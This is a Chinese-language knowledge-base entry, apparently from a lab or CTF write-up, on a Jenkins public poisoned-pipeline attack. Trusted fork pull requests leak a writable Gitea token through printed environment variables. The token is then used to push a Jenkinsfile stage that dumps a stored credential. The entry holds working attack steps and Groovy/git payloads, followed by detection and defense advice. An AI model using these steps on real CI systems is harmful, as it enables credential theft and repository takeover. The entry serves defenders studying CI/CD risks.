---
id: cloud-cicd-jenkins-public-ppe-fork-pr-token-repo-takeover
title: Jenkins 公开 PPE：fork PR 信任策略泄露 Gitea Token，再借 Token 改流水线做二阶段凭据窃取
type: scenario
domain: cloud
path: cloud/ci-cd
technique: jenkins-public-ppe-fork-pr-token-repo-takeover
tags:
- cicd
- jenkins
- ppe
- fork-pr
- token-leak
- repo-takeover
- credentials
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V658
  verified_at: '2026-11-13T06:42:09+08:00'
  notes: 已对照图04/06核对 fork PR + Trust Everyone、env 输出 GITEA_TOKEN=5d3ed556... 及用 token clone 仓库；第二阶段正式仓库 push 后的构建日志原文未展示。
url: /docs/cloud/ci-cd/cloud-cicd-jenkins-public-ppe-fork-pr-token-repo-takeover/
draft: false
kb_aliases:
- Public PPE
- P-PPE
- fork PR 信任
- Discover pull requests from forks
- Trust Everyone
- Gitea token 泄露
- 仓库接管
---

## 一句话结论

Jenkins multibranch 任务若开启 "Discover pull requests from forks" 且 Trust 策略为 Everyone，攻击者从 fork 提 PR 就能让修改过的 Jenkinsfile 在带凭据的流水线中执行；先用 `env` 打印环境变量拿到具备仓库写权限的 Gitea token，再用该 token 直接修改/推送正式仓库与 Jenkinsfile，第二阶段读取流水线凭据（flag2）。

## 原理

- **公开 PPE**：面向 fork 的 PR 发现机制把外部贡献者的 PR 当作普通 PR 构建，`Trust: Everyone` 表示不限制来源；PR 中的 Jenkinsfile 会以构建身份执行。
- **构建环境自带 SCM 凭据**：multibranch/PR 构建常把 SCM token 注入为 `GITEA_TOKEN`/`GITHUB_TOKEN` 等环境变量，用于回写构建状态；该 token 若权限过大（可写仓库），攻击者可直接 `env` 读出。
- **权限升级**：拿到写权限 token 后，攻击者突破"只能提 PR、不能 push"的限制，直接修改主分支/流水线定义，把窃取凭据的 stage 放进正式构建，读取更高权限的 `flag2`。
- **两阶段利用**：第一阶段拿低权限 token 完成仓库接管，第二阶段在受信任的正式构建中执行，规避 PR 构建可能的凭据限制。

## 触发条件

- Jenkins job 配置了 `Discover pull requests from forks` 且 Trust 策略为 Everyone（或等价的公开 PR 构建）。
- PR 构建环境注入了可写仓库的 SCM token（如 GITEA_TOKEN）且对构建日志/命令可见。
- 攻击者可 fork 仓库并提 PR；正式流水线使用更高价值凭据（flag2）。
- 目标 SCM（Gitea/GitLab）未限制 token 权限或 token 可克隆/推送其他仓库。

## 利用步骤

1. fork 目标仓库，clone 后把 `Jenkinsfile` 改为只执行 `sh "env"`，推送到 fork 分支并向 main 提 PR。
2. Jenkins 以 `Trust Everyone` 构建 PR，控制台 `env` 输出中出现 `GITEA_TOKEN=5d3ed556...`。
3. 用该 token clone 原仓库：`git clone http://5d3ed556...@gitea:3000/Wonderland/caterpillar.git`（token 作为用户名）。
4. 在正式仓库中修改 Jenkinsfile 增加：
   ```groovy
   stage('deploy') {
       steps {
           withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'flag2', passwordVariable: 'TOKEN')]) {
               sh 'echo $TOKEN | base64'
           }
       }
   }
   ```
5. push 触发主分支构建，从日志取 flag2 的 base64。

## PoC

```groovy
// 阶段一：读取构建环境变量
pipeline { agent any; stages { stage('env') { steps { sh 'env' } } } }
```

```bash
# 阶段二：用泄露 token 接管仓库后读取 flag2
git clone http://<GITEA_TOKEN>@127.0.0.1:3000/Wonderland/caterpillar.git
# 修改 Jenkinsfile（见上）后 push，触发构建
```

原文在 PR 构建日志中直接看到 `GITEA_TOKEN=5d3ed556...`，并验证该 token 可克隆仓库。

## 变体与关联

- **平台变体**：GitHub Actions `pull_request_target` + checkout PR 代码、GitLab CI 外部 PR 流水线等同类信任错配；见 [[cloud-cicd-github-actions-pull-request-target-checkout-rce]]。
- **二阶段变体**：泄露的 token 也可能是云厂商短期凭据、包仓库 token，可直接访问外部资源。
- **同族**：[[cloud-cicd-jenkins-direct-ppe-jenkinsfile-credential-exfil]]、[[cloud-cicd-jenkins-indirect-ppe-build-script-makefile]]。

## 检测与防御

- **不要信任 fork PR**：将 "Trust" 策略改为仅信任受控来源；对 fork PR 使用只读 token、无生产凭据、隔离 agent。
- **最小权限 token**：SCM token 仅授予必要范围（只写 commit status，不给仓库写权限）；定期轮换。
- **环境变量卫生**：不要在构建环境中暴露长期可写 token；使用短期 OIDC 凭据。
- **检测**：审计 `env`/`printenv` 输出与日志中的 token 模式；监控异常 `git clone/push` 与仓库权限变更；关注 fork PR 构建的异常命令。
